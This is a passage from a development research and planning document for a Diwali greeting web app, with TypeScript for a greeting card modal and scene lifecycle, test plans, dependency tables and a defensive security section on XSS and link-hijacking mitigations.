          <svg class="w-36 h-5 fill-none stroke-current stroke-1.5" viewBox="0 0 160 20">
            <path d="M10 10 Q 40 18, 70 10 Q 75 4, 80 1 Q 85 4, 90 10 Q 120 18, 150 10" />
            <circle cx="80" cy="5" r="2.5" class="fill-amber-400" />
            <circle cx="65" cy="10" r="1.5" class="fill-amber-400/80" />
            <circle cx="95" cy="10" r="1.5" class="fill-amber-400/80" />
          </svg>
        </div>

        <p id="greeting-recipient" class="text-sm font-semibold text-amber-200/90 tracking-wide mb-2"></p>

        <div class="my-3 max-h-44 sm:max-h-52 overflow-y-auto px-2">
          <p id="greeting-message" class="text-sm sm:text-base italic text-amber-100/95 leading-relaxed font-serif"></p>
        </div>

        <p id="greeting-sender" class="text-sm font-semibold text-amber-300 tracking-wide mt-2 mb-6"></p>

        <a
          id="whatsapp-reply-btn"
          href="#"
          target="_blank"
          rel="noopener noreferrer"
          class="w-full py-3.5 px-6 rounded-xl font-semibold text-xs sm:text-sm tracking-wider uppercase bg-gradient-to-r from-amber-500 via-amber-400 to-amber-600 text-amber-950 shadow-lg shadow-amber-500/20 active:scale-[0.98] transition-all flex items-center justify-center gap-2 cursor-pointer no-underline"
        >
          <span>Reply Happy Diwali on WhatsApp</span>
          <span class="text-base">✨</span>
        </a>

        <div class="mt-4">
          <a
            id="creator-badge"
            href="#create"
            class="text-xs font-medium text-amber-400/70 hover:text-amber-300 underline underline-offset-4 transition-colors cursor-pointer"
          >
            Create Your Own Wish ✨
          </a>
        </div>
      </div>
    `;

    container.appendChild(this.overlayEl);

    this.cardEl = this.overlayEl.querySelector('#greeting-card');
    this.recipientEl = this.overlayEl.querySelector('#greeting-recipient');
    this.messageEl = this.overlayEl.querySelector('#greeting-message');
    this.senderEl = this.overlayEl.querySelector('#greeting-sender');
    this.whatsappBtnEl = this.overlayEl.querySelector('#whatsapp-reply-btn');
    this.creatorBadgeEl = this.overlayEl.querySelector('#creator-badge');
  }

  public show(payload: GreetingPayload | null): void {
    const recipient = payload?.recipient?.trim() || 'Dear Friend';
    const message = payload?.message?.trim() ||
      'Wishing you and your loved ones a joyous, prosperous, and luminous Diwali! May this festival of lights illuminate your path with happiness and success.';
    const sender = payload?.sender?.trim() || 'A Well-Wisher';

    if (this.recipientEl) this.recipientEl.textContent = `To: ${recipient}`;
    if (this.messageEl) this.messageEl.textContent = `“${message}”`;
    if (this.senderEl) this.senderEl.textContent = `— With love, ${sender}`;

    if (this.whatsappBtnEl) {
      this.whatsappBtnEl.href = createWhatsAppReplyUrl(sender);
    }

    if (this.cardEl) {
      // Allow browser reflow, then apply active entrance classes
      requestAnimationFrame(() => {
        this.cardEl?.classList.remove('opacity-0', 'scale-95', 'translate-y-4', 'pointer-events-none');
        this.cardEl?.classList.add('opacity-100', 'scale-100', 'translate-y-0', 'pointer-events-auto');
      });
    }
  }

  public hide(): void {
    if (this.cardEl) {
      this.cardEl.classList.remove('opacity-100', 'scale-100', 'translate-y-0', 'pointer-events-auto');
      this.cardEl.classList.add('opacity-0', 'scale-95', 'translate-y-4', 'pointer-events-none');
    }
  }

  public dispose(): void {
    if (this.overlayEl) {
      this.overlayEl.remove();
      this.overlayEl = null;
      this.cardEl = null;
      this.recipientEl = null;
      this.messageEl = null;
      this.senderEl = null;
      this.whatsappBtnEl = null;
      this.creatorBadgeEl = null;
    }
  }
}
```

### 3. SceneManager Lifecycle Coordination Hook
```typescript
  // Inside SceneManager.ts
  private celebrationTimeoutId: ReturnType<typeof setTimeout> | null = null;
  private celebrationManager: CelebrationManager | null = null;
  private greetingModal: GreetingModal | null = null;

  private handleStateChange(state: AppState): void {
    if (state === 'LIT_CELEBRATION') {
      // 1500ms celebratory pause before transitioning to GREETING_REVEAL per D-01
      if (this.celebrationTimeoutId) clearTimeout(this.celebrationTimeoutId);
      this.celebrationTimeoutId = setTimeout(() => {
        this.fsm?.transition({ type: 'CELEBRATION_COMPLETE' });
      }, 1500);
    } else if (state === 'GREETING_REVEAL') {
      // Smooth camera tilt up by +0.20 units framing diya in lower third (D-01)
      this.cameraRig?.panTargetTo(new THREE.Vector3(0, 0.85, 0), 1200);

      // Launch celebratory golden confetti cannons (D-04)
      this.celebrationManager?.fireCelebrationBurst();

      // Unfurl glassmorphic greeting card with decrypted payload (D-01, D-02)
      this.greetingModal?.show(this.fsm?.getGreeting() ?? null);

      // Enable interactive tap-to-sparkle listener (D-05, VFX-05)
      this.celebrationManager?.setActive(true);
    }
  }
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| **HTML String Concatenation (`innerHTML`)** | Strict Text Node Assignment (`textContent`) | Modern Web Standards / ASVS V5 | Eliminates 100% of DOM XSS injection vectors without needing external sanitization libraries. |
| **3D WebGL Confetti Meshes** | Isolated 2D Canvas Confetti (`canvas-confetti`) | 2020+ High-Performance WebGL | Preserves 60 FPS mobile WebGL rendering by decoupling celebration particles from the 3D scene graph. |
| **Custom Protocol Schemes (`whatsapp://send`)** | Universal Web Links (`https://wa.me/?text=`) | WhatsApp API v2 | Seamlessly works across Android, iOS WebKit, Instagram In-App Browser, and WhatsApp Web. |
| **Heavy Post-Processing Bloom Passes** | CSS `backdrop-blur-xl` + Additive Billboards | 2022+ Mobile WebGL Guidance | Delivers radiant glowing glassmorphic optics at near-zero GPU fill rate cost. |

## Assumptions Log

| # | Claim | Section | Risk if Wrong |
|---|-------|---------|---------------|
| A1 | System serif font stack (`font-serif`) provides sufficient cultural elegance without downloading external Google Fonts. | Standard Stack & Typography | Low. If custom fonts (Cinzel, Playfair) are mandated, adding a `<link>` in `index.html` is trivial, but system serif loads with 0ms network latency. |

## Open Questions (RESOLVED)

1. **Should `canvas-confetti` use the default global canvas or a custom dedicated canvas element?**
   - RESOLVED: Use the default global canvas managed by `canvas-confetti`. Calling `confetti(...)` creates an absolute full-viewport canvas with `position: fixed; pointer-events: none; z-index: 100`, avoiding custom dimension synchronization or resize handling. `confetti.reset()` safely clears and resets this canvas upon `dispose()`.
2. **How to handle tap-to-sparkle pointer coordinate normalization across different device pixel ratios and viewport sizes?**
   - RESOLVED: Pointer coordinates are normalized to the `[0, 1]` range required by `canvas-confetti.origin` using `origin: { x: clientX / window.innerWidth, y: clientY / window.innerHeight }`. This dimensionless ratio is natively device-pixel-ratio independent, correctly mapping screen touches on both high-DPI iOS/Android phones and desktop viewports.
3. **How to prevent tap-to-sparkle micro-bursts from firing when the recipient interacts with the GreetingModal (e.g. clicking WhatsApp button)?**
   - RESOLVED: The greeting card modal overlay uses `pointer-events-none` on the outer backdrop container and `pointer-events-auto` on the inner card (`#greeting-card`). In the global `pointerdown` listener, any event whose target satisfies `e.target.closest('#greeting-card, button, a, input')` is immediately ignored, preventing confetti triggering during card button clicks while allowing taps anywhere in the surrounding festive void to trigger sparkler micro-bursts.
4. **How to guarantee strict ASVS V5 XSS protection when rendering encrypted user-provided text payloads?**
   - RESOLVED: Recipient, sender, and personal message text are injected strictly via `element.textContent = value` (never `innerHTML`). Static DOM markup (ornamental SVG filigree, glassmorphic card border, button frames) is rendered separately from text node insertion. Robust fallback defaults ("Dear Friend", "A Well-Wisher", default Diwali wish) are applied if fields are empty or undefined.
5. **How should the transition from `LIT_CELEBRATION` to `GREETING_REVEAL` be timed without race conditions?**
   - RESOLVED: Upon entering `LIT_CELEBRATION` in `SceneManager.handleStateChange()`, a 1500ms `setTimeout` is scheduled. When the timer elapses, `this.fsm.transition({ type: 'CELEBRATION_COMPLETE' })` is invoked. If `dispose()` is called before the timer completes (e.g., user navigates away or tests tear down), the pending timeout ID is cleared via `clearTimeout()`, preventing orphan callbacks.

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| **Node.js** | Build & Test Tooling | ✓ | v22.16.0 | — |
| **npm** | Package Manager | ✓ | 10.9.2 | — |
| **Vitest** | Automated Test Framework | ✓ | v3.2.7 | — |
| **Happy-DOM** | Headless DOM Environment | ✓ | v21.0.0 | — |
| **canvas-confetti** | Confetti Engine | ✓ (npm) | 1.9.4 | Verified on npm registry; installed in Wave 0 |
| **@types/canvas-confetti** | Confetti Type Definitions | ✓ (npm) | 1.9.0 | Verified on npm registry; installed in Wave 0 |

## Validation Architecture

### Test Framework
| Property | Value |
|----------|-------|
| Framework | Vitest v3.2.7 + Happy-DOM v21.0.0 |
| Config file | `vitest.config.ts` |
| Quick run command | `npx vitest run tests/ui/ tests/fx/` |
| Full suite command | `npm test` |

### Phase Requirements → Test Map
| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|-------------|
| **WISH-01** | Injects recipient, message, and sender strictly via `textContent` with fallback defaults | unit | `npx vitest run tests/ui/greeting-modal.test.ts` | ❌ Wave 0 |
| **WISH-02** | Generates safe `https://wa.me/?text=` URL with RFC 3986 encoded festive emojis | unit | `npx vitest run tests/ui/whatsapp-link.test.ts` | ❌ Wave 0 |
| **WISH-03** | Renders discreet creator Instagram badge linking to `#create` / creator channel | unit | `npx vitest run tests/ui/greeting-modal.test.ts` | ❌ Wave 0 |
| **VFX-05** | Dual-cannon celebration burst and tap-to-sparkle origin calculation ignoring card clicks | unit | `npx vitest run tests/fx/celebration-manager.test.ts` | ❌ Wave 0 |
| **LIFECYCLE** | FSM auto-transitions `LIT_CELEBRATION` -> `GREETING_REVEAL` after 1500ms, triggering camera pan and reveal | unit | `npx vitest run tests/graphics/scene-manager.test.ts` | ✅ |
| **REGRESSION** | Full test suite passes without regressions | suite | `npm test` | ✅ |

### Sampling Rate
- **Per task commit:** `npx vitest run tests/ui/ tests/fx/`
- **Per wave merge:** `npm test && npx vite build`
- **Phase gate:** Full suite green (135+ existing tests + new Phase 5 tests) before `/gsd-verify-work`

### Wave 0 Gaps
- [ ] `npm install canvas-confetti@^1.9.4 && npm install -D @types/canvas-confetti@^1.9.0`
- [ ] `tests/ui/greeting-modal.test.ts` — unit test suite for `GreetingModal` mounting, `textContent` injection, fallback defaults, and entrance animation classes.
- [ ] `tests/ui/whatsapp-link.test.ts` — unit test suite for WhatsApp URL generation, URI encoding, and emoji serialization.
- [ ] `tests/fx/celebration-manager.test.ts` — unit test suite for dual-cannon bursts, pointer event origin mapping, card-click exclusion, and teardown.

*(Note on Vitest + Happy-DOM: `canvas-confetti` must be mocked in unit tests via `vi.mock('canvas-confetti', ...)` because Happy-DOM returns `null` for `HTMLCanvasElement.prototype.getContext('2d')`.)*

## Security Domain

### Applicable ASVS Categories

| ASVS Category | Applies | Standard Control |
|---------------|---------|-----------------|
| **V2 Authentication** | no | Phase 1 established zero-backend passcode gating; Phase 5 presents decrypted payload. |
| **V3 Session Management** | no | Client-side ephemeral session state only. |
| **V4 Access Control** | no | Access controlled cryptographically via AES-GCM in Phase 1. |
| **V5 Input Validation & Output Encoding** | **YES** | Strict `textContent` DOM node assignment for all payload fields (`recipient`, `sender`, `message`). Never use `innerHTML`. |
| **V6 Cryptography** | no | Cryptographic decryption verified in Phase 1. |
| **V14 Lifecycle & Resource Teardown** | **YES** | Strict `dispose()` cascades removing event listeners, clearing timers, resetting confetti canvas, and unmounting DOM nodes. |

### Known Threat Patterns for Phase 5 Stack

| Pattern | STRIDE | Standard Mitigation |
|---------|--------|---------------------|
| **Stored DOM XSS via Encrypted Payload** | Tampering / Elevation of Privilege | Attacker encodes `<script>` or malicious HTML into payload. Mitigated by using `element.textContent = value`, parsing as pure text nodes (ASVS V5). |
| **DOM Redirection / Link Hijacking** | Spoofing | Attacker manipulates WhatsApp reply URL or creator badge. Mitigated by strict URL whitelist format `https://wa.me/?text=` with RFC 3986 `encodeURIComponent()`, using `rel="noopener noreferrer"`. |
| **Confetti Particle Flood Denial of Service** | Denial of Service | Rapid pointer events cause thousands of particles, freezing mobile browser. Mitigated by restricting tap sparkles to discrete `pointerdown` events and capping particle count at 25 with 100-tick lifetime. |
| **Memory / Listener Leak on Repeated Unlocks** | Denial of Service | Replaying the experience attaches duplicate pointer listeners and timers. Mitigated by explicit `dispose()` cleanup. |

## Sources

### Primary (HIGH confidence)
- `canvas-confetti` NPM package and source repository (`github.com/catdad/canvas-confetti`) [VERIFIED: npm registry, npm view]
- OWASP ASVS v4.0.3 Chapter 5: Input Validation and Output Encoding Standard [VERIFIED: OWASP ASVS]
- WhatsApp Universal Links Documentation (`faq.whatsapp.com`) [VERIFIED: WhatsApp FAQ]
- Existing workspace source files: `src/app/state-machine.ts`, `src/crypto/types.ts`, `src/graphics/camera-rig.ts`, `src/graphics/scene-manager.ts`, `src/interaction/touch-controller.ts` [VERIFIED: file reads this session]

### Secondary (MEDIUM confidence)
- MDN Web Docs: Pointer Events API (`PointerEvent.clientX`, `PointerEvent.clientY`)
- MDN Web Docs: Web Cryptography API and DOM `Node.textContent`
- Bundlephobia package metrics: `canvas-confetti` (~5.8 KB gzipped)

### Tertiary (LOW confidence)
- None. All packages and APIs verified directly against registries and codebase sources.

## Metadata

**Confidence breakdown:**
- Standard stack: HIGH — `canvas-confetti@1.9.4` verified on npm registry with 9.6M weekly downloads; zero-backend architecture.
- Architecture: HIGH — Clear state machine progression (`LIT_CELEBRATION` -> 1500ms -> `GREETING_REVEAL`), proven component patterns.
- Security: HIGH — OWASP ASVS V5 textContent output encoding eliminates XSS risk.
- Pitfalls: HIGH — Happy-DOM canvas mocking and touch delegation thoroughly investigated.

**Research date:** 2026-11-04  
**Valid until:** 2026-12-04 (30 days)
